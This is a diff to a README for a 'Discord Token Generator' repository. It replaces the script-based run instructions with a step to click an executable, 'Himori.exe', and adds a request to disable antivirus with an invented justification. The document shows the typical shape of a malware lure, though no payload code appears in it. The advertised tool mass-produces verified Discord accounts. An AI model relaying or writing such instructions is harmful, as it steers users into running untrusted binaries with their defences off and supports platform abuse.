@@ -1,28 +1,24 @@
 # Gen-Token-Discord
 Gennarator Token Discord Verified Email and Phone Number
 
-![s](https://exportcomments.com/resources/content/images/size/w2000/2020/07/y6rc2sm425051.jpg)
+![s](https://cdn.discordapp.com/attachments/961644288733757521/975485220847501382/himori_1.gif)
 
 # Discord Token Generator
 
 ## How to Install
 
 ```
-Click Install.bat and waiting!
+Click open files and see Himori.exe!
 ```
 
 ## How to Run
 
 ```
-python main.py
-```
-##  or
-
-```
-node index.js
+Click Himori.exe to run 
 ```
 
-# Thank you for using my tools
-> You can use it for free!
+
+# Pleas disable Anti virus 
+> Anti virus is not supported My module because it is an editor that imports Gen Token files.
 
 # **Enjoin with your Token :)**
